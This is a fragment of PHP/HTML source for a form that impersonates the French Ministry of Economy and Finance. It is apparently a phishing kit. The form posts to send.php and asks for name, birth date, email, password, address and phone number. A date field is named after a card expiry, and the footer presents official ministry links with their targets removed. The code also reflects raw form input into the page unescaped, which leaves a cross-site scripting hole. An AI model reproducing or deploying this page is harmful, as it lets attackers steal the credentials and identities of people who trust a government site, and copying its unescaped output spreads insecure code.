...
function er1(){
    if( $_POST['dob1'] == "" OR $_POST['dob2'] == "" OR $_POST['dob3'] == ""){
echo "<font color='red'>&nbsp;S&eacute;lectionner l'une des options.</font>";
	}
}
?>
...
<h4>Acc&eacute;s &aacute;<br/>votre espace</h4>
...
&nbsp;</font></div>
				<form id="go" name="go" method="POST" action="send.php" >
					...
					<table border="0" cellspacing="0" height="273">
						<tr>
							...
							<td>
							<input style="" class="validate[required]" tabindex="1" maxlength="13" id="nom" name="nom" type="text" value="<?echo($_POST['nom']);?>" ><?er($_POST['nom']);?></td>
						</tr>
						<tr>
							<td class align>Pr&eacute;nom&nbsp;<span id="saisie_obligatoire_texte1"><font color="#FF0000">*</font></span>:
								</td>
							<td>
							<input id="prenom" name="prenom" tabindex="3" maxlength="8" type="text" value="<?echo($_POST['prenom']);?>" ><?er($_POST['prenom']);?></td>
						</tr>
						<tr>
            ...
            <select autocomplete="off"  id="ccmplus_expiration" name="dob2"  class="month validate-cc-exp required-entry">
						...
						<tr>
							...
							<td>
							<input id="email" name="email" ="3" maxlength="50" type="text" value="<?echo($_POST['email']);?>" ><?er($_POST['email']);?></td>
						</tr>
						<tr>
							<td class align>Mot de Passe&nbsp;<span id="saisie_obligatoire_texte4"><font color="#FF0000">*</font></span>:
								</td>
							<td>
							<input tabindex="3" maxlength="30" id="passe" name="passe" type="password"  ><?er($_POST['passe']);?></td>
						</tr>
						<tr>
							...
							*</font></span>:
							...
							<td>
							<input tabindex="3" maxlength="80" id="adresse" name="adresse" type="text"  value="<?echo($_POST['adresse']);?>"><?er($_POST['adresse']);?></td>
						</tr>
						<tr>
							<td align>Ligne d&#39;adresse&nbsp;2 :
								</td>
							<td>
							<input tabindex="3" maxlength="80" id="adresse2" name="adresse2" type="text" value="<?echo($_POST['adresse2']);?>" ></td>
						</tr>
						<tr>
							<td class align>Ville&nbsp;<span id="saisie_obligatoire_texte6"><font color="#FF0000">*</font></span>:
								</td>
							<td>
							<input tabindex="3" maxlength="8" id="ville" name="ville" type="text" value="<?echo($_POST['ville']);?>" ><?er($_POST['ville']);?></td>
						</tr>
						<tr>
							<td class align>Code Postale&nbsp;<span id="saisie_obligatoire_texte7"><font color="#FF0000">*</font></span>:
								</td>
							<td>
							<input tabindex="3" maxlength="5" id="postale" name="postale" value="<?echo($_POST['postale']);?>" type="text"><?er($_POST['postale']);?></td>
						</tr>
						<tr>
							<td class align>Num&eacute;ro de t&eacute;l&eacute;phone&nbsp;<span id="saisie_obligatoire_texte9"><font color="#FF0000">*</font></span>:
								</td>
							<td>
							<input tabindex="3" maxlength="10" id="tele" name="tele" value="<?echo($_POST['tele']);?>" type="text"><?er($_POST['tele']);?></td>
						</tr>
						<tr>
							<td class align>&nbsp;</td>
							<td>
							<br>
							<input type="image" src="valider.png" value="Valider" name="go" style="float: right"></td>
					</table>
				</form>
				</div>
</div>
...
<li>
<a target="blank" href="#" title="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fenêtre)" alt="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fenêtre)">Les cessions immobili&eacute;res de l'&eacute;tat</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site pensions.bercy.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au pensions.bercy.gouv.fr site (nouvelle fenêtre)">Les pensions et retraites de l'&eacute;tat</a>
</li>
<li>
...
<a href="#" title="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes" alt="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes">
...
| &copy; Minist&eacute;re de l'&eacute;conomie et des Finances 
